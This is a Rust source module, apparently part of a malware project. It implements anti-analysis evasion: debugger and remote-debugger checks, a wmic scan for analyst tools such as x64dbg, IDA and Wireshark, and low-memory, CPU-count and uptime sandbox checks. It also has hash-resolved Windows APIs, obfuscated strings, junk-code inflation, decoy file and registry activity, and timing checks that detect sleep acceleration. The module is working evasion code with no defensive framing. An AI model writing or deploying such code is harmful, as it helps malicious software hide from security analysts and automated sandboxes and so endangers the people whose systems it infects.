use update::sprotect;
use crate::api_resolve::HashedAPIs;
use std::time::{Duration, Instant};
use rand::Rng;

#[cfg(windows)]
use winapi::um::sysinfoapi::MEMORYSTATUSEX;
#[cfg(windows)]
use std::arch::x86_64::_rdtsc;

//#junk(name="inflation_junk")

#[inline(never)]
#[allow(dead_code)]
fn _junk_zcbezzxundum(_d0: u32, _p1: u32, _d2: u32) -> u32 {
    let _o79 = 354 << 1;
    let _v57 = 714 << 3;
    let _y54 = 24 * 46;
    let _o19 = 910 + 429;
    let _c97 = 507 << 2;
    let _h96 = 814 >> 1;
    let _o12 = 239 ^ 89;
    let _v17 = 36 * 50;
    _v17
}

//#endjunk()

pub fn detect_sandbox_environment() -> bool {
    //#jcall(name="inflation_junk")
    let _ = _junk_zcbezzxundum(427, 727, 71);
    let mut flags = 0u32;
    
    if check_debugger() { flags |= 1; }
    if check_remote_debugger() { flags |= 2; }
    if check_parent_process() { flags |= 4; }
    if check_low_memory() { flags |= 8; }
    if check_low_cpu_count() { flags |= 16; }
    if check_recent_boot() { flags |= 32; }
    
    flags > 0
}

#[cfg(windows)]
fn check_debugger() -> bool {
    unsafe { HashedAPIs::is_debugger_present() != 0 }
}

#[cfg(not(windows))]
fn check_debugger() -> bool {
    false
}

#[cfg(windows)]
fn check_remote_debugger() -> bool {
    unsafe {
        let mut is_debugged: i32 = 0;
        let result = HashedAPIs::check_remote_debugger_present(
            HashedAPIs::get_current_process(),
            &mut is_debugged as *mut i32
        );
        result != 0 && is_debugged != 0
    }
}

#[cfg(not(windows))]
fn check_remote_debugger() -> bool {
    false
}

#[cfg(windows)]
fn check_parent_process() -> bool {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    if let Ok(output) = Command::new(sprotect!("wmic"))
        .args([&sprotect!("process"), &sprotect!("get"), &sprotect!("parentprocessid,name")])
        .creation_flags(0x08000000)
        .output()
    {
        let output_str = String::from_utf8_lossy(&output.stdout);
        let suspicious = [
            sprotect!("python"),
            sprotect!("wireshark"),
            sprotect!("fiddler"),
            sprotect!("procmon"),
            sprotect!("processhacker"),
            sprotect!("x64dbg"),
            sprotect!("ollydbg"),
            sprotect!("ida"),
        ];
        
        for keyword in &suspicious {
            if output_str.to_lowercase().contains(&keyword.to_lowercase()) {
                return true;
            }
        }
    }
    false
}

#[cfg(not(windows))]
fn check_parent_process() -> bool {
    false
}

#[cfg(windows)]
fn check_low_memory() -> bool {
    unsafe {
        let mut mem_status: MEMORYSTATUSEX = std::mem::zeroed();
        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        
        if HashedAPIs::global_memory_status_ex(&mut mem_status as *mut _ as *mut std::ffi::c_void) != 0 {
            let total_gb = mem_status.ullTotalPhys / (1024 * 1024 * 1024);
            return total_gb < 4;
        }
    }
    false
}

#[cfg(not(windows))]
fn check_low_memory() -> bool {
    false
}

#[cfg(windows)]
fn check_low_cpu_count() -> bool {
    unsafe {
        let mut sys_info: winapi::um::sysinfoapi::SYSTEM_INFO = std::mem::zeroed();
        HashedAPIs::get_system_info(&mut sys_info as *mut _ as *mut std::ffi::c_void);
        sys_info.dwNumberOfProcessors < 2
    }
}

#[cfg(not(windows))]
fn check_low_cpu_count() -> bool {
    false
}

#[cfg(windows)]
fn check_recent_boot() -> bool {
    use crate::api_resolve::HashedAPIs;
    
    unsafe {
        let uptime_ms = HashedAPIs::get_tick_count_64();
        let uptime_minutes = uptime_ms / (1000 * 60);
        uptime_minutes < 10
    }
}

#[cfg(not(windows))]
fn check_recent_boot() -> bool {
    false
}

pub fn inflate_execution() {
    let mut rng = rand::thread_rng();
    let iterations = rng.gen_range(15..30);
    
    for i in 0..iterations {
        match i % 5 {
            0 => legitimate_file_operations(),
            1 => legitimate_registry_reads(),
            2 => computational_work(),
            3 => system_info_queries(),
            _ => timing_based_delays(),
        }
        
        let jitter_ms = rng.gen_range(500..2000);
        std::thread::sleep(Duration::from_millis(jitter_ms));
    }
}

#[cfg(windows)]
fn legitimate_file_operations() {
    use std::fs;
    use std::path::PathBuf;
    
    let paths = [
        PathBuf::from(sprotect!("C:\\Windows\\System32\\kernel32.dll")),
        PathBuf::from(sprotect!("C:\\Windows\\System32\\ntdll.dll")),
        PathBuf::from(sprotect!("C:\\Windows\\System32\\user32.dll")),
    ];
    
    for path in &paths {
        let _ = fs::metadata(path);
        let _ = fs::read(path).map(|data| data.len());
    }
}

#[cfg(not(windows))]
fn legitimate_file_operations() {}

#[cfg(windows)]
fn legitimate_registry_reads() {
    use winapi::um::winnt::KEY_READ;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    
    let keys = [
        sprotect!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion"),
        sprotect!("SYSTEM\\CurrentControlSet\\Control"),
    ];
    
    for key_path in &keys {
        let wide: Vec<u16> = OsStr::new(key_path).encode_wide().chain(Some(0)).collect();
        unsafe {
            let mut hkey: *mut std::ffi::c_void = std::ptr::null_mut();
            if HashedAPIs::reg_open_key_ex_w(
                winapi::um::winreg::HKEY_LOCAL_MACHINE as *mut _,
                wide.as_ptr(),
                0,
                KEY_READ,
                &mut hkey
            ) == 0 {
                HashedAPIs::reg_close_key(hkey);
            }
        }
    }
}

#[cfg(not(windows))]
fn legitimate_registry_reads() {}

fn computational_work() {
    let mut rng = rand::thread_rng();
    let base: u64 = rng.gen_range(1000..10000);
    
    let _ = (0..base).fold(0u64, |acc, x| acc.wrapping_add(x * x));
    
    let _ = is_prime(base);
}

fn is_prime(n: u64) -> bool {
    if n < 2 { return false; }
    if n == 2 { return true; }
    if n % 2 == 0 { return false; }
    
    let sqrt_n = (n as f64).sqrt() as u64;
    for i in (3..=sqrt_n).step_by(2) {
        if n % i == 0 {
            return false;
        }
    }
    true
}

#[cfg(windows)]
fn system_info_queries() {
    unsafe {
        let mut sys_info: winapi::um::sysinfoapi::SYSTEM_INFO = std::mem::zeroed();
        HashedAPIs::get_system_info(&mut sys_info as *mut _ as *mut std::ffi::c_void);
        
        let _ = sys_info.dwNumberOfProcessors;
        let _ = sys_info.dwPageSize;
    }
}

#[cfg(not(windows))]
fn system_info_queries() {}

fn timing_based_delays() {
    let start = Instant::now();
    let target_delay = Duration::from_millis(rand::thread_rng().gen_range(100..500));
    
    #[cfg(target_arch = "x86_64")]
    unsafe {
        let tsc_start = _rdtsc();
        std::thread::sleep(target_delay);
        let tsc_end = _rdtsc();
        let tsc_diff = tsc_end - tsc_start;
        
        let actual_elapsed = start.elapsed();
        if actual_elapsed < target_delay / 2 {
            std::thread::sleep(target_delay * 3);
        }
    }
    
    #[cfg(not(target_arch = "x86_64"))]
    std::thread::sleep(target_delay);
}

pub fn enhanced_sleep_with_acceleration_check(minutes: u64) {
    let start = Instant::now();
    let target_duration = Duration::from_secs(minutes * 60);
    
    let checkpoint_interval = Duration::from_secs(10);
    let mut last_checkpoint = Instant::now();
    
    while start.elapsed() < target_duration {
        std::thread::sleep(Duration::from_secs(1));
        
        if last_checkpoint.elapsed() >= checkpoint_interval {
            let expected = checkpoint_interval;
            let actual = last_checkpoint.elapsed();
            
            if actual < expected / 2 {
                inflate_execution();
                return;
            }
            
            last_checkpoint = Instant::now();
        }
    }
}
